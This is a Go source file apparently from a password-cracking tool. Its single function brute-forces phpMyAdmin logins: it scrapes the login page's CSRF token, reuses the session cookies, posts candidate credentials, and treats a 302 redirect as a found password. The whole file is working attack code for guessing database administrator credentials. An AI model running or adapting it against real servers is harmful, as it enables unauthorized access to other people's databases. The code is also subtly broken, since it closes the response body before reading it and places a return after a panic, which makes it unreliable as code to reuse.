package crack

import (
	"bufio"
	"cube/model"
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
)

func PhpmyadminCrack(task model.CrackTask) (result model.CrackTaskResult) {
	result = model.CrackTaskResult{CrackTask: task, Result: "", Err: nil}
	clt := http.Client{}
	req, _ := http.NewRequest("GET", task.Ip, nil)
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req.Header.Add("Connection", "close")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Add("Accept-Charset", "utf-8")
	resp, err := clt.Do(req)
	if err != nil {
		panic(err)
		return
	}
	resp.Body.Close()

	data := make([]byte, 40250)
	c := bufio.NewReader(resp.Body)
	c.Read(data)
	//content, _ := ioutil.ReadAll(resp.Body)
	r := regexp.MustCompile(`(?U)name="token" value="(.*)"`)
	match := r.FindStringSubmatch(string(data))
	if match == nil {
		return
	}
	token := strings.TrimSpace(match[1])

	jar, _ := cookiejar.New(nil)
	host, _ := url.Parse(task.Ip)
	jar.SetCookies(host, resp.Cookies())
	crackClt := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Jar: jar}

	//fmt.Println(jar.Cookies(host))

	urlValues := url.Values{}
	urlValues.Add("pma_username", task.Auth.User)
	urlValues.Add("pma_password", task.Auth.Password)
	urlValues.Add("pma_lang", "zh_CN")
	urlValues.Add("server", "1")
	urlValues.Add("token", token)

	//body := strings.NewReader(urlValues.Encode())
	resp2, _ := crackClt.PostForm(task.Ip, urlValues)
	if resp2.StatusCode == 302 {
		result.Result = fmt.Sprintf("Password: %s", task.Auth.Password)
	}

	return result
}
